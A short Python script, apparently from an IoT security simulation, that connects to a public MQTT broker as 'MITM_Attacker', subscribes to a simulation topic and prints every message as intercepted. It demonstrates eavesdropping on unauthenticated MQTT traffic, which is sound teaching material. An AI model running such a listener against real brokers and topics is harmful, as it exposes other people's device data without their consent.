import paho.mqtt.client as mqtt

def on_message(client, userdata, message):
    print(f"[Attacker] Intercepted: {message.payload}")

client = mqtt.Client(client_id="MITM_Attacker", protocol=mqtt.MQTTv311)
client.connect("broker.hivemq.com")
client.subscribe("iot/simulation/topic")
print("[Attacker] Listening for intercepted messages...")
client.on_message = on_message
client.loop_forever()
